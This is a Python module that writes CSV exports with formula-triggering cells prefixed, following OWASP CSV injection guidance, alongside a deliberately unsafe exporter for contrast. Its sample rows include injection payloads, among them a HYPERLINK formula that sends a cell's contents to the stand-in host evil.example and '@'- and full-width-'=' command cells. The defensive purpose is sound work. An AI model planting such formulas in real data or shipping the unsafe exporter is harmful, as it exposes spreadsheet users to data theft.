"""Write CSV exports whose cells cannot start a spreadsheet formula. Author: Sandeep Belgavi.

Standard library only. Follows the OWASP CSV Injection guidance: a cell that begins with
=, +, -, @, tab, carriage return or line feed (or a full-width =, +, -, @) is prefixed with a
single quote, and the csv module quotes every field so separators and quotes stay inside it.
"""
import csv
import io

TRIGGERS = ('=', '+', '-', '@', '\t', '\r', '\n', '\uff1d', '\uff0b', '\uff0d', '\uff20')


def neutralize(value, numeric_ok=False, prefix="'"):
    """Return the cell text to write. Numbers that were numbers in the data stay unprefixed when
    numeric_ok is True, so a refund of -3.0 still sorts as a number in the sheet. OWASP also
    describes a tab prefix for files that will be saved and re-opened in Excel; pass prefix='\t'."""
    if numeric_ok and isinstance(value, (int, float)):
        return str(value)
    text = '' if value is None else str(value)
    if text.startswith(TRIGGERS):
        return prefix + text
    return text


def export(rows, header, numeric_columns=(), prefix="'"):
    buf = io.StringIO(newline='')
    writer = csv.writer(buf, quoting=csv.QUOTE_ALL, lineterminator='\r\n')
    writer.writerow(header)
    for row in rows:
        writer.writerow([neutralize(row[h], numeric_ok=h in numeric_columns, prefix=prefix) for h in header])
    return buf.getvalue()


def unsafe_export(rows, header):
    buf = io.StringIO(newline='')
    writer = csv.writer(buf, lineterminator='\r\n')
    writer.writerow(header)
    for row in rows:
        writer.writerow([row[h] for h in header])
    return buf.getvalue()


def starts_formula(cell):
    """The check a spreadsheet effectively applies to an unquoted, unprefixed cell."""
    return str(cell).startswith(TRIGGERS)


HEADER = ['case', 'customer', 'note', 'refund']
ROWS = [
    {'case': 'CASE-4201', 'customer': 'Geetha', 'note': 'Cover torn on arrival', 'refund': 12.5},
    {'case': 'CASE-4202', 'customer': '=HYPERLINK("https://evil.example/?d="&A2,"Open order")', 'note': 'Wrong edition', 'refund': 0},
    {'case': 'CASE-4203', 'customer': 'Jenya', 'note': '@SUM(1+1)*cmd', 'refund': -3.0},
    {'case': 'CASE-4204', 'customer': 'Tanishka', 'note': '-2+3 copies short', 'refund': 7},
    {'case': 'CASE-4205', 'customer': '\uff1dCMD()', 'note': 'Full-width equals sign', 'refund': 0},
]

if __name__ == '__main__':
    import sys
    sys.stdout.reconfigure(encoding='utf-8')
    print(unsafe_export(ROWS, HEADER))
    print(export(ROWS, HEADER, numeric_columns=('refund',)))
